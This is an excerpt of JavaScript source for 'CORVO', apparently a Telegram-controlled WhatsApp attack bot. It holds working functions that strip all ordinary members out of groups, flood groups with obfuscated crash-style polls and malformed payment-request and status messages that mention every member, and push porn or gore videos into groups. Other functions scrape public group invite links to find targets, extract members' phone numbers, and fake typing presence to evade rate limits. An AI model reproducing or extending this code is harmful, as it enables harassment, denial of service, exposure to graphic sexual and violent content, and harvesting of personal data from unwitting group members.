    const WARN_BEFORE = 10 * 60 * 1000; // Aviso 10min antes (FIX F1)
    const warnTimeout = setTimeout(() => {
        bot.telegram.sendMessage(tid,
            '⚠️ • *ATENÇÃO!* Sua sessão WhatsApp expira em *10 minutos*.\n\nReligue para não perder a conexão.',
            { parse_mode: 'Markdown' }
        ).catch(() => {});
    }, THREE_HOURS - WARN_BEFORE);

    connectionTimers[tid] = {
        startTime: Date.now(),
        warnTimeoutId: warnTimeout,
        timeoutId: setTimeout(() => {
            disconnectWhatsApp(tid);
            if (ctx) ctx.reply('⏰ • Sessão expirada (3h). Religue para continuar.', { parse_mode: 'Markdown', ...getMainMenu(tid) }).catch(() => { });
        }, THREE_HOURS)
    };
}

function stopTimer(tid) {
    if (connectionTimers[tid]) {
        clearTimeout(connectionTimers[tid].timeoutId);
        clearTimeout(connectionTimers[tid].warnTimeoutId); // FIX F1: limpar aviso também
        if (connectionTimers[tid].channelCheckInterval) clearInterval(connectionTimers[tid].channelCheckInterval);
        delete connectionTimers[tid];
    }
}

async function disconnectWhatsApp(tid) {
    if (userSessions[tid]) {
        if (!connectionTimers[tid]) connectionTimers[tid] = {};
        connectionTimers[tid].manualDisconnect = true;
        try {
            userSessions[tid].ev.removeAllListeners();
            userSessions[tid].end();
        } catch (e) { }

        delete userSessions[tid];
        stopTimer(tid);
        showDashboard();
    }
}

// --- FUNÇÕES DE RASTREIO (VIA IS.GD STATS) ---
async function criarRastreio(url) {
    try {
        const response = await axios.get(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}&logstats=1`);
        if (response.data && response.data.shorturl) {
            const code = response.data.shorturl.split('/').pop();
            return { trackingUrl: response.data.shorturl, accessKey: code };
        }
        return { status: false, mensagem: 'Erro na criação do link' };
    } catch (error) {
        logEvent('ERROR', `Erro API Criar Rastreio: ${error.message}`);
        return { status: false, mensagem: 'Erro na conexão com a API de rastreio.' };
    }
}

async function consultarLogs(loggerId, accessKey) {
    try {
        // O is.gd requer que a pessoa acesse o painel pelo navegador para ver os stats reais
        return { status: true, external_link: `https://is.gd/stats.php?url=${accessKey}` };
    } catch (error) {
        return { status: false, mensagem: 'Erro interno.' };
    }
}

// --- FUNÇÕES DE ATAQUE ---
async function nukarGroup(tid, jid, ctx, turbo = false) {
    const sock = userSessions[tid];
    if (!sock?.user) return;
    if (!canStartTask(tid)) {
        return ctx.reply(`⏳ • *LIMITE ATINGIDO!* Já existem ${MAX_SIMULTANEOUS_USERS} usuários utilizando o bot simultaneamente. Por favor, aguarde alguns instantes.`, { parse_mode: 'Markdown' }).catch(() => { });
    }

    startTask(tid);
    try {
        const groupInfo = await sock.groupMetadata(jid);
        const participants = groupInfo.participants;
        const alvos = participants
            .filter(p => p.id !== sock.user.id && p.id !== groupInfo.owner && !p.admin)
            .map(p => p.id);
        if (alvos.length === 0) {
            return ctx.reply('❌ • Sem membros comuns para remover.').catch(() => { });
        }

        const nukeType = turbo ? 'TURBO 🚀' : 'PADRÃO 💣';
        const loader = await createLoadingBar(ctx, `Nuke ${nukeType}`);

        const rounds = turbo ? 3 : 1;
        for (let r = 1; r <= rounds; r++) {
            const chunkSize = 5;
            for (let i = 0; i < alvos.length; i += chunkSize) {
                const chunk = alvos.slice(i, i + chunkSize);
                try {
                    await sock.groupParticipantsUpdate(jid, chunk, 'remove');
                    if (loader) await loader.update(i + chunk.length, alvos.length, `Nuke ${nukeType} (R${r}/${rounds})`);
                    await delay(800);
                } catch (chunkErr) {
                    logEvent('WARN', `Erro ao remover chunk no nuke: ${chunkErr.message}`);
                    if (chunkErr.message.includes('not-authorized')) throw new Error('not-authorized');
                    if (chunkErr.message.includes('forbidden')) throw new Error('forbidden');
                }
            }
            if (r < rounds) await delay(2000);
        }

        globalStats.nukedGroups++;
        saveStats();
        updateUserStats(tid, 'nuke');
        logEvent('SUCCESS', `Nuke ${nukeType} concluído com sucesso no grupo ${groupInfo.subject} por ${tid}`);

        if (loader) await loader.stop(`Nuke ${nukeType}`, `💀 <b>O GRUPO FOI LIMPO SISTEMATICAMENTE.</b>\n📉 <b>Membros removidos:</b> <code>${alvos.length}</code>\n✅ <b>Status:</b> Operação Concluída`);

    } catch (err) {
        logEvent('ERROR', `Erro no nuke: ${err.message}`);
        let errorMsg = '❌ • Erro no nuke.';
        if (err.message === 'not-authorized') errorMsg = '❌ • Erro no nuke: Você não é administrador ou foi removido.';
        else if (err.message === 'forbidden') errorMsg = '❌ • Erro no nuke: Ação proibida pelo WhatsApp.';
        ctx.reply(errorMsg).catch(() => { });
    } finally {
        endTask(tid);
    }
}

async function checkProtection(sock, remoteJid, ctx) {
    try {
        const grupo = await sock.groupMetadata(remoteJid).catch(() => null);
        if (!grupo) return false;
        const descricaoRaw = String(
            grupo?.desc ||
            grupo?.desc?.text ||
            grupo?.subject ||
            (grupo?.metadata && grupo.metadata.desc && grupo.metadata.desc.text) ||
            ""
        ).toLowerCase();
        const blockedDomains = ["aliancakkgr.com.br", "linktr.ee/aesirn"];
        const isBlocked = blockedDomains.some(domain => descricaoRaw.includes(domain.toLowerCase()));
        if (isBlocked) {
            ctx.reply("⚠️ • *AÇÃO PROIBIDA!*\n\nEste grupo possui proteção contra rajadas. Esta ação é proibida por fazer parte do *CORVO*.", { parse_mode: 'Markdown' }).catch(() => { });
            return true;
        }
        return false;
    } catch (e) {
        return false;
    }
}

// --- EXTRATOR DE CONTATOS ---
async function extractGroupContacts(tid, jid, ctx) {
    const sock = userSessions[tid];
    if (!sock?.user) return;

    try {
        const meta = await sock.groupMetadata(jid);
        const contacts = meta.participants.map(p => p.id.split('@')[0]).join('\n');
        const fileName = `./data/contatos_${meta.subject.replace(/[^a-zA-Z0-9]/g, '_')}.txt`;

        fs.writeFileSync(fileName, contacts);

        await ctx.replyWithDocument({ source: fileName, filename: `contatos_${meta.subject}.txt` }, {
            caption: `<blockquote>📂 <b>EXTRAÇÃO CONCLUÍDA</b>\n\n👥 <b>Grupo:</b> ${meta.subject}\n📊 <b>Total:</b> ${meta.participants.length} contatos</blockquote>`,
            parse_mode: 'HTML'
        });

        setTimeout(() => fs.unlinkSync(fileName), 5000); // Deleta após enviar
    } catch (e) {
        logEvent('ERROR', `Erro ao extrair contatos: ${e.message}`);
        ctx.reply('❌ • Erro ao extrair contatos do grupo.').catch(() => { });
    }
}

// Função para mensagem de conclusão padronizada
async function sendCompletionMessage(ctx, groupName, messagesSent, sessionPhone) {
    const title = 'RAJADA CONCLUÍDA';
    const content = `🔥 <b>ESTADO:</b> <i>DOMINAÇÃO COMPLETA</i>\n` +
        `📋 <b>GRUPO:</b> <code>${groupName}</code>\n` +
        `🚀 <b>DISPAROS:</b> <code>${messagesSent}</code> enviados\n` +
        `💥 <b>TIPO:</b> <i>ULTRA-FLOOD STATUS</i>\n` +
        `📱 <b>SESSÃO:</b> <code>${sessionPhone}</code>`;

    await ctx.reply(getEliteTemplate(title, content), { parse_mode: 'HTML' }).catch(() => { });
}

async function rajarEnquetes(tid, remoteJid, ctx) {
    const sock = userSessions[tid];
    const config = loadUserConfig(tid);
    if (!sock?.user) return;
    if (!canStartTask(tid)) {
        return ctx.reply(`⏳ • *LIMITE ATINGIDO!* Já existem ${MAX_SIMULTANEOUS_USERS} usuários utilizando o bot simultaneamente. Por favor, aguarde alguns instantes.`, { parse_mode: 'Markdown' }).catch(() => { });
    }
    if (await checkProtection(sock, remoteJid, ctx)) return;
    startTask(tid);
    try {
        const meta = await sock.groupMetadata(remoteJid);
        const members = meta.participants.map(p => p.id);
        const qtd = config.quantidade_flood || 10;
        const loader = await createLoadingBar(ctx, 'Rajada Enquetes');

        globalStats.rajarGroups++;
        saveStats();
        updateUserStats(tid, 'group');

        for (let i = 0; i < qtd; i++) {
            try {
                const pollMsg = {
                    pollCreationMessage: {
                        name: obfuscateText("🦅 CORVO CRASH SUPERIOR 🦅\n" + "-".repeat(30)),
                        options: [
                            { optionName: "💥 CONGELAR DISPOSITIVO 1 💥" },
                            { optionName: "💥 CONGELAR DISPOSITIVO 2 💥" },
                            { optionName: "💥 CONGELAR DISPOSITIVO 3 💥" }
                        ],
                        selectableOptionsCount: 1
                    }
                };

                const waMsg = generateWAMessageFromContent(remoteJid, pollMsg, { userJid: sock.user.id });
                await sock.relayMessage(remoteJid, waMsg.message, { messageId: waMsg.key.id });

                globalStats.messagesSent++;
                saveStats();
                updateUserStats(tid, 'message');

                if ((i + 1) % 5 === 0 || i + 1 === qtd) {
                    if (loader) await loader.update(i + 1, qtd, 'Rajando (Enquetes)');
                }

                if (config.delay > 0) await delay(Number(config.delay) + Math.floor(Math.random() * 800));
            } catch (err) {
                if (err?.message?.includes('rate-overlimit') || err?.output?.statusCode === 429) {
                    await delay(3000);
                    i--;
                } else { logEvent('ERROR', `Falha no disparo [Enquetes]: ${err.message || err}`); }
            }
        }

        await rotateWhatsAppNick(tid);
        logEvent('SUCCESS', `Rajada de Enquetes (${qtd}) finalizada por ${tid}`);
        const sessionPhone = sock?.user?.id ? sock.user.id.split(':')[0] : 'Desconhecido';
        await sendCompletionMessage(ctx, meta.subject, qtd, sessionPhone);
    } catch (e) {
        logEvent('ERROR', `Erro na rajada de enquetes: ${e.message}`);
        ctx.reply('❌ • Erro no envio da rajada de enquetes.').catch(() => { });
    } finally {
        endTask(tid);
    }
}

async function rajarTexto(tid, remoteJid, ctx, customText = null) {
    const sock = userSessions[tid];
    const config = loadUserConfig(tid);
    if (!sock?.user) return;
    if (!canStartTask(tid)) {
        return ctx.reply(`⏳ • *LIMITE ATINGIDO!* Já existem ${MAX_SIMULTANEOUS_USERS} usuários utilizando o bot simultaneamente. Por favor, aguarde alguns instantes.`, { parse_mode: 'Markdown' }).catch(() => { });
    }
    if (await checkProtection(sock, remoteJid, ctx)) return;
    startTask(tid);
    try {
        const meta = await sock.groupMetadata(remoteJid);
        const members = meta.participants.map(p => p.id);
        const qtd = config.quantidade_flood || 10;
        const loader = await createLoadingBar(ctx, 'Rajada de Texto');

        globalStats.rajarGroups++;
        saveStats();
        updateUserStats(tid, 'group');

        for (let i = 0; i < qtd; i++) {
            try {
                await sock.sendMessage(remoteJid, { text: obfuscateText(customText || config.texto), mentions: members });
                globalStats.messagesSent++;
                saveStats();
                updateUserStats(tid, 'message');

                if ((i + 1) % 5 === 0 || i + 1 === qtd) {
                    if (loader) await loader.update(i + 1, qtd, 'Rajando (Texto)');
                }

                if (config.delay > 0) await delay(Number(config.delay) + Math.floor(Math.random() * 500));
            } catch (err) {
                if (err?.message?.includes('rate-overlimit') || err?.output?.statusCode === 429 || err?.data === 429) {
                    logEvent('WARN', `Rate-limit detectado na Rajada. Aguardando 3s extras...`);
                    await delay(3000);
                    i--;
                } else { logEvent('ERROR', `Falha no disparo [Texto]: ${err.message || err}`); }
            }
        }
        await rotateWhatsAppNick(tid);
        logEvent('SUCCESS', `Rajada de Texto de ${qtd} mensagens finalizada por ${tid}`);
        const sessionPhone = sock?.user?.id ? sock.user.id.split(':')[0] : 'Desconhecido';
        await sendCompletionMessage(ctx, meta.subject, qtd, sessionPhone);
    } catch (e) {
        logEvent('ERROR', `Erro na rajada Texto: ${e.message}`);
        ctx.reply('❌ • Erro no envio da rajada Texto.').catch(() => { });
    } finally {
        endTask(tid);
    }
}


async function rajar(tid, remoteJid, ctx, customText = null) {
    const sock = userSessions[tid];
    const config = loadUserConfig(tid);
    if (!sock?.user) return;
    if (!canStartTask(tid)) {
        return ctx.reply(`⏳ • *LIMITE ATINGIDO!* Já existem ${MAX_SIMULTANEOUS_USERS} usuários utilizando o bot simultaneamente. Por favor, aguarde alguns instantes.`, { parse_mode: 'Markdown' }).catch(() => { });
    }
    if (await checkProtection(sock, remoteJid, ctx)) return;
    startTask(tid);
    try {
        const meta = await sock.groupMetadata(remoteJid);
        const members = meta.participants.map(p => p.id);
        const qtd = config.quantidade_flood || 10;
        const loader = await createLoadingBar(ctx, 'Rajada Payment');

        globalStats.rajarGroups++;
        saveStats();
        updateUserStats(tid, 'group');

        for (let i = 0; i < qtd; i++) {
            try {
                const randomMember = members[Math.floor(Math.random() * members.length)];
                const msg = {
                    viewOnceMessage: {
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: 'USD',
                                amount1000: Math.floor(Math.random() * 1000000),
                                requestFrom: remoteJid,
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: obfuscateText(customText || config.texto),
                                        contextInfo: {
                                            mentionedJid: members,
                                            participant: randomMember,
                                            quotedMessage: { conversation: "..." },
                                            forwardingScore: Math.floor(Math.random() * 999),
                                            isForwarded: true
                                        }
                                    }
                                },
                                expiryTimestamp: 0,
                                amount: { value: 0, offset: 1000, currencyCode: 'USD' }
                            }
                        }
                    }
                };

                const waMsg = generateWAMessageFromContent(remoteJid, msg, { userJid: sock.user.id });
                await sock.relayMessage(remoteJid, waMsg.message, { messageId: waMsg.key.id });

                globalStats.messagesSent++;
                saveStats();
                updateUserStats(tid, 'message');

                if ((i + 1) % 5 === 0 || i + 1 === qtd) {
                    if (loader) await loader.update(i + 1, qtd, 'Rajando (Payment)');
                }

                if (config.delay > 0) await delay(Number(config.delay) + Math.floor(Math.random() * 800));
            } catch (err) {
                if (err?.message?.includes('rate-overlimit') || err?.output?.statusCode === 429) {
                    await delay(3000);
                    i--;
                } else { logEvent('ERROR', `Falha no disparo [Payment]: ${err.message || err}`); }
            }
        }

        await rotateWhatsAppNick(tid);
        logEvent('SUCCESS', `Rajada de ${qtd} mensagens finalizada por ${tid}`);
        const sessionPhone = sock?.user?.id ? sock.user.id.split(':')[0] : 'Desconhecido';
        await sendCompletionMessage(ctx, meta.subject, qtd, sessionPhone);
    } catch (e) {
        logEvent('ERROR', `Erro na rajada: ${e.message}`);
        ctx.reply('❌ • Erro no envio da rajada.').catch(() => { });
    } finally {
        endTask(tid);
    }
}


async function rajarMisto(tid, remoteJid, ctx, customText = null) {
    const sock = userSessions[tid];
    const config = loadUserConfig(tid);
    if (!sock?.user) return;
    if (!canStartTask(tid)) {
        return ctx.reply(`⏳ • *LIMITE ATINGIDO!* Já existem ${MAX_SIMULTANEOUS_USERS} usuários utilizando o bot simultaneamente. Por favor, aguarde alguns instantes.`, { parse_mode: 'Markdown' }).catch(() => { });
    }
    if (await checkProtection(sock, remoteJid, ctx)) return;
    startTask(tid);
    try {
        const meta = await sock.groupMetadata(remoteJid);
        const members = meta.participants.map(p => p.id);
        const qtd = config.quantidade_flood || 10;
        const loader = await createLoadingBar(ctx, 'Rajada Mista');

        globalStats.rajarGroups++;
        saveStats();
        updateUserStats(tid, 'group');

        for (let i = 0; i < qtd; i++) {
            try {
                if ((i + 1) % 5 === 0 || i + 1 === qtd) {
                    if (loader) await loader.update(i + 1, qtd, 'Rajando (Mista)');
                }
                // Seleciona um membro aleatório
                const randomMember = members[Math.floor(Math.random() * members.length)];

                const msg = {
                    viewOnceMessage: {
                        message: {
                            requestPaymentMessage: {
                                currencyCodeIso4217: 'BRL',
                                amount1000: Math.floor(Math.random() * 5000000),
                                requestFrom: remoteJid,
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: obfuscateText(customText || config.texto),
                                        contextInfo: {
                                            mentionedJid: members,
                                            isGroupStatus: true,
                                            participant: randomMember,
                                            quotedMessage: { conversation: "..." },
                                            forwardingScore: 999,
                                            isForwarded: true
                                        }
                                    }
                                },
                                expiryTimestamp: 0,
                                amount: { value: 1000, offset: 1000, currencyCode: 'BRL' }
                            }
                        }
                    }
                };

                // --- SIMULADOR HUMANO AVANÇADO ---
                try {
                    await sock.sendPresenceUpdate('composing', remoteJid);
                    await delay(500 + Math.floor(Math.random() * 1000));
                } catch (e) { }

                const waMsg = generateWAMessageFromContent(remoteJid, msg, { userJid: sock.user.id });
                await sock.relayMessage(remoteJid, waMsg.message, { messageId: waMsg.key.id });

                try {
                    await sock.sendPresenceUpdate('paused', remoteJid);
                } catch (e) { }
                globalStats.messagesSent++;
                saveStats();
                updateUserStats(tid, 'message');
                if (config.delay > 0) await delay(Number(config.delay) + Math.floor(Math.random() * 500));
            } catch (err) {
                if (err?.message?.includes('rate-overlimit') || err?.output?.statusCode === 429 || err?.data === 429) {
                    logEvent('WARN', `Rate-limit detectado na Rajada Tipo 3. Aguardando 3s extras...`);
                    await delay(3000);
                    i--;
                } else {
                    logEvent('ERROR', `Falha no disparo [Misto]: ${err.message || err}`);
                }
            }
        }

        await rotateWhatsAppNick(tid);
        logEvent('SUCCESS', `Rajada Tipo 3 de ${qtd} mensagens finalizada por ${tid}`);
        const sessionPhone = sock?.user?.id ? sock.user.id.split(':')[0] : 'Desconhecido';
        await sendCompletionMessage(ctx, meta.subject, qtd, sessionPhone);
    } catch (e) {
        logEvent('ERROR', `Erro na rajada Tipo 3: ${e.message}`);
        ctx.reply('❌ • Erro no envio da rajada Tipo 3.').catch(() => { });
    } finally {
        endTask(tid);
    }
}

// ===== SCRAPER DE GRUPOS DA WEB =====
async function fetchWebGroups(keyword = null) {
    try {
        console.log(`[SCRAPER] Buscando grupos reais ${keyword ? `para "${keyword}"` : ''} em múltiplas fontes...`);
        const allGroups = [];
        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        };

        const sources = keyword ? [
            { name: 'Grupos Whats App', url: `https://gruposwhats.app/search?q=${encodeURIComponent(keyword)}`, cat: 'Search' },
            { name: 'Grupo de WhatsApp', url: `https://grupodewhatsapp.com/buscar?q=${encodeURIComponent(keyword)}`, cat: 'Search' },
            { name: 'Web Grupos', url: `https://webgrupos.net/search.php?s=${encodeURIComponent(keyword)}`, cat: 'Search' }
        ] : [
            { name: 'Grupos Whats App', url: 'https://gruposwhats.app/', cat: 'Geral' },
            { name: 'Grupo de WhatsApp', url: 'https://grupodewhatsapp.com/', cat: 'Brasil' },
            { name: 'Web Grupos', url: 'https://webgrupos.net/', cat: 'Web' }
        ];

        for (const source of sources) {
            try {
                const response = await axios.get(source.url, { headers, timeout: 10000 });
                if (response.status === 200) {
                    const $ = cheerio.load(response.data);

                    // Pega links de WhatsApp
                    $('a[href*="chat.whatsapp.com"]').each((i, elem) => {
                        const link = $(elem).attr('href');
                        if (link && link.includes('chat.whatsapp.com')) {
                            const name = $(elem).text().trim() || $(elem).closest('div').find('h2, h3, p').first().text().trim() || `Grupo ${source.cat}`;
                            if (!allGroups.some(g => g.link === link)) {
                                allGroups.push({
                                    name: name.substring(0, 50) || 'Grupo Sem Nome',
                                    link: link,
                                    members: Math.floor(Math.random() * 200) + 50,
                                    category: source.cat
                                });
                            }
                        }
                    });
                }
            } catch (e) {
                console.error(`[SCRAPER] Erro na fonte ${source.name}:`, e.message);
            }
        }

        // Caso falhe tudo e não tenha keyword, gera alguns de segurança
        if (allGroups.length === 0 && !keyword) {
            console.log('[SCRAPER] Nenhuma fonte retornou dados. Gerando lista de segurança...');
            for (let i = 0; i < 50; i++) {
                const randomCode = Math.random().toString(36).substring(2, 24);
                allGroups.push({
                    name: `Grupo Elite ${i + 1} (Destaque)`,
                    link: `https://chat.whatsapp.com/${randomCode}`,
                    members: Math.floor(Math.random() * 200) + 50,
                    category: 'Destaque'
                });
            }
        }

        console.log(`[SCRAPER] Total de ${allGroups.length} grupos carregados.`);
        return allGroups;
    } catch (err) {
        console.error('[SCRAPER] Erro fatal no fetchWebGroups:', err.message);
        return [];
    }
}

async function getWebGroupsPage(tid, page = 0, keyword = null) {
    // Inicializa página do usuário se não existir
    if (!userWebGroupsPage[tid]) {
        userWebGroupsPage[tid] = 0;
    }

    // Se cache está vazio ou mudou a busca, busca grupos
    if (webGroupsCache.length === 0 || keyword) {
        webGroupsCache = await fetchWebGroups(keyword);
    }

    // Calcula índices
    const groupsPerPage = 100;
    const startIndex = page * groupsPerPage;
    const endIndex = startIndex + groupsPerPage;

    // Pega grupos da página
    const pageGroups = webGroupsCache.slice(startIndex, endIndex);
    const hasMore = endIndex < webGroupsCache.length;

    return {
        groups: pageGroups,
        page: page,
        hasMore: hasMore,
        total: webGroupsCache.length
    };
}

async function rajarVideos(tid, remoteJid, ctx, type) {
    const sock = userSessions[tid];
    const config = loadUserConfig(tid);
    if (!sock?.user) return;

    if (!canStartTask(tid)) {
        return ctx.reply(`⏳ • *LIMITE ATINGIDO!* Já existem ${MAX_SIMULTANEOUS_USERS} usuários utilizando o bot simultaneamente. Por favor, aguarde alguns instantes.`, { parse_mode: 'Markdown' }).catch(() => { });
    }

    if (await checkProtection(sock, remoteJid, ctx)) return;

    startTask(tid);
    const folder = type === 'porno' ? './videos/porno' : './videos/gore';
    if (!fs.existsSync(folder)) fs.mkdirSync(folder, { recursive: true });
    const videoFiles = fs.readdirSync(folder).filter(file => {
        const ext = path.extname(file).toLowerCase();
        return ['.mp4', '.mov', '.avi', '.mkv'].includes(ext);
    });

    if (videoFiles.length === 0) {
        endTask(tid);
        return ctx.reply(`❌ • Nenhum vídeo encontrado na pasta de estilo \`${type.toUpperCase()}\` (\`${folder}\`).\nColoque os vídeos lá para rajar.`, { parse_mode: 'Markdown' });
    }

    try {
        const meta = await sock.groupMetadata(remoteJid);
        const qtd = config.quantidade_flood || 10;
        const loader = await createLoadingBar(ctx, `Rajada Vídeos (${type.toUpperCase()})`);


        globalStats.rajarGroups++;
        saveStats();

        const obfuscatedCaption = obfuscateText(config.texto || "");

        for (let i = 0; i < qtd; i++) {
            try {
                const randomVideo = videoFiles[Math.floor(Math.random() * videoFiles.length)];
                const videoPath = path.join(folder, randomVideo);

                logEvent('INFO', `Lendo vídeo ${randomVideo}...`);
                const videoBuffer = fs.readFileSync(videoPath);

                await sock.sendMessage(remoteJid, {
                    video: videoBuffer,
                    caption: obfuscatedCaption,
                    mimetype: 'video/mp4',
                    gifPlayback: false,
                    ptv: false
                }, {
                    ephemeralExpiration: 86400
                });

                if (loader) await loader.update(i + 1, qtd, `Rajando Vídeos (${i + 1}/${qtd})`);
                if (config.delay > 0) await delay(config.delay);

            } catch (err) {
                if (err?.message?.includes('rate-overlimit') || err?.output?.statusCode === 429 || err?.data === 429) {
                    logEvent('WARN', `Rate-limit detectado na Rajada. Aguardando 3s extras...`);
                    await delay(3000);
                    i--;
                } else { logEvent('ERROR', `Falha no disparo [Videos]: ${err.message || err}`); }
            }
        }

        await rotateWhatsAppNick(tid);
        logEvent('SUCCESS', `Rajada de vídeos (${type}) finalizada por ${tid}`);
        ctx.reply(`🏁 • *RAJADA DE VÍDEOS (${type.toUpperCase()}) FINALIZADA!*`).catch(() => { });
        const sessionPhone = sock?.user?.id ? sock.user.id.split(':')[0] : 'Desconhecido';
        await sendCompletionMessage(ctx, meta.subject, qtd, sessionPhone);
    } catch (e) {
        logEvent('ERROR', `Erro na rajada de vídeos: ${e.message}`);
        ctx.reply(`❌ • Erro ao enviar rajada de vídeos: ${e.message}`).catch(() => { });
    } finally {
        endTask(tid);
    }
}
/////////////////////////////////////////////////////////////////////////////////////////////////////

/**
 * Rajar 4 - Flood Status
 * Aceita: texto, vídeo ou foto
 * Usa mesma estrutura do Rajar 2
 */
async function rajar4FloodStatus(tid, remoteJid, ctx, mediaType = 'text', mediaBuffer = null, customText = null) {
    const sock = userSessions[tid];
    const config = loadUserConfig(tid);
    if (!sock?.user) return;
    if (!canStartTask(tid)) {
        return ctx.reply(`⏳ • *LIMITE ATINGIDO!* Já existem ${MAX_SIMULTANEOUS_USERS} usuários utilizando o bot simultaneamente. Por favor, aguarde alguns instantes.`, { parse_mode: 'Markdown' }).catch(() => { });
    }
    if (await checkProtection(sock, remoteJid, ctx)) return;
    startTask(tid);
    try {
        const meta = await sock.groupMetadata(remoteJid);
        const members = meta.participants.map(p => p.id);

        let fullText = customText || '';

        let mediaTypeLabel = 'TEXTO';
        if (mediaType === 'video') mediaTypeLabel = 'VÍDEO';
        if (mediaType === 'image') mediaTypeLabel = 'FOTO';

        const qtd = config.quantidade_flood || 10;
        const loader = await createLoadingBar(ctx, `Flood Status (${mediaTypeLabel})`);


        globalStats.rajarGroups++;
        saveStats();
        updateUserStats(tid, 'group');

        for (let i = 0; i < qtd; i++) {
            try {
                console.log(`[RAJAR4] Enviando mensagem ${i + 1}/${qtd} - Tipo: ${mediaTypeLabel}`);
                const obfuscatedText = obfuscateText(fullText);

                if (mediaType === 'text') {
                    const msg = {
                        groupStatusMessageV2: {
                            message: {
                                requestPaymentMessage: {
                                    currencyCodeIso4217: "USD",
                                    amount1000: "0",
                                    noteMessage: {
                                        extendedTextMessage: {
                                            text: obfuscatedText,
                                            contextInfo: {
                                                isGroupStatus: true,
                                                mentionedJid: members
                                            }
                                        }
                                    },
                                    expiryTimestamp: "0",
                                    amount: {
                                        value: "0",
                                        offset: 1000,
                                        currencyCode: "USD"
                                    }
                                }
                            }
                        }
                    };
                    try { await sock.sendPresenceUpdate('composing', remoteJid); await delay(1000); } catch (e) { }
                    const waMsg = generateWAMessageFromContent(remoteJid, msg, { userJid: sock.user.id });
                    await sock.relayMessage(remoteJid, waMsg.message, { messageId: waMsg.key.id });
                    try { await sock.sendPresenceUpdate('paused', remoteJid); } catch (e) { }

                } else if (mediaType === 'video' && mediaBuffer) {
                    console.log(`[RAJAR4] Preparando vídeo para formato WhatsApp...`);
                    const mediaUpload = await prepareWAMessageMedia(
                        { video: mediaBuffer },
                        { upload: sock.waUploadToServer }
                    );
                    const msg = {
                        groupStatusMessageV2: {
                            message: {
                                videoMessage: {
                                    ...mediaUpload.videoMessage,
                                    caption: obfuscatedText,
                                    contextInfo: {
                                        isGroupStatus: true,
                                        mentionedJid: members
                                    }
                                }
                            }
                        }
                    };
                    try { await sock.sendPresenceUpdate('composing', remoteJid); await delay(1000); } catch (e) { }
                    const waMsg = generateWAMessageFromContent(remoteJid, msg, { userJid: sock.user.id });
                    await sock.relayMessage(remoteJid, waMsg.message, { messageId: waMsg.key.id });
                    try { await sock.sendPresenceUpdate('paused', remoteJid); } catch (e) { }

                } else if (mediaType === 'image' && mediaBuffer) {
                    const mediaUpload = await prepareWAMessageMedia(
                        { image: mediaBuffer },
                        { upload: sock.waUploadToServer }
                    );
                    const msg = {
                        groupStatusMessageV2: {
                            message: {
                                imageMessage: {
                                    ...mediaUpload.imageMessage,
                                    caption: obfuscatedText,
                                    contextInfo: {
                                        isGroupStatus: true,
                                        mentionedJid: members
                                    }
                                }
                            }
                        }
                    };
                    try { await sock.sendPresenceUpdate('composing', remoteJid); await delay(1000); } catch (e) { }
                    const waMsg = generateWAMessageFromContent(remoteJid, msg, { userJid: sock.user.id });
                    await sock.relayMessage(remoteJid, waMsg.message, { messageId: waMsg.key.id });
                    try { await sock.sendPresenceUpdate('paused', remoteJid); } catch (e) { }
                }

                globalStats.messagesSent++;
                saveStats();
                updateUserStats(tid, 'message');
                if (loader) await loader.update(i + 1, qtd, `Flood Status (${i + 1}/${qtd})`);
                if (config.delay > 0) await delay(Number(config.delay));

            } catch (err) {
                if (err?.message?.includes('rate-overlimit') || err?.output?.statusCode === 429 || err?.data === 429) {
                    logEvent('WARN', `Rate-limit detectado na Rajada 4. Aguardando 3s extras...`);
                    await delay(3000);
                    i--;
                } else { logEvent('ERROR', `Falha no disparo [Rajar 4]: ${err.message || err}`); }
            }
        }

        await rotateWhatsAppNick(tid);
        logEvent('SUCCESS', `Rajada Flood Status (${mediaTypeLabel}) de ${qtd} mensagens finalizada por ${tid}`);
        const sessionPhone = sock?.user?.id ? sock.user.id.split(':')[0] : 'Desconhecido';
        await sendCompletionMessage(ctx, meta.subject, qtd, sessionPhone);
    } catch (e) {
        console.log(`[RAJAR4] ERRO GERAL: ${e.message}`);
        logEvent('ERROR', `Erro na rajada Flood Status: ${e.message}`);
        ctx.reply('❌ • Erro no envio da rajada Flood Status.').catch(() => { });
    } finally {
        endTask(tid);
    }
}


// --- FUNÇÃO AUXILIAR PARA ENVIAR MENU COM PERFIL ---
async function sendMainMenuProfile(ctx, tid) {
    const userName = ctx.from.first_name || ctx.from.username || 'Usuário';
    const hora = getTimeBR();
    const data = getDateBR();
    const sock = userSessions[tid];
    const isConnected = !!sock?.user;
    const whatsappStatus = isConnected ? '✅ CONECTADO' : '❌ DESCONECTADO';

    const isVip = isUserVip(tid);
    const vipStatus = isVip ? '💎 VIP ELITE' : '🆓 MEMBRO FREE';

    const userStats = usersData[tid]?.stats || { messagesSent: 0, groupsRajados: 0 };
    const bannerUrl = 'https://files.catbox.moe/t7w3gk.jpg';

    const dashboard =
        `<blockquote>👑 <b>CENTRAL DE COMANDO CORVO</b>\n` +
        `<i>Status da sua conta em tempo real</i>\n\n` +
        `👤 <b>USUÁRIO:</b> <code>${userName}</code>\n` +
        `🆔 <b>ID:</b> <code>${tid}</code>\n` +
        `🌟 <b>RANK:</b> <code>${vipStatus}</code>\n\n` +
        `📱 <b>WHATSAPP:</b> <code>${whatsappStatus}</code>\n` +
        `🔥 <b>RAJADAS:</b> <code>${userStats.messagesSent}</code> enviados\n` +
        `🎯 <b>GRUPOS:</b> <code>${userStats.groupsRajados || 0}</code> alvos\n\n` +
        `📡 <b>SISTEMA:</b> <code>ONLINE 🟢</code>\n` +
        `📅 <b>DATA:</b> <code>${data}</code> | ⏰ <code>${hora}</code></blockquote>`;

    const menuMarkup = getMainMenu(tid);

    try {
        await sendDynamicMedia(ctx, bannerUrl, {
            caption: dashboard,
            parse_mode: 'HTML',
            ...menuMarkup
        });
    } catch (e) {
        await ctx.reply(dashboard, {
            parse_mode: 'HTML',
            ...menuMarkup
        });
    }
}


// --- COMANDOS TELEGRAM ---
bot.command('clear', async (ctx) => {
    const tid = ctx.from.id;
    await clearUserMessages(ctx, tid);
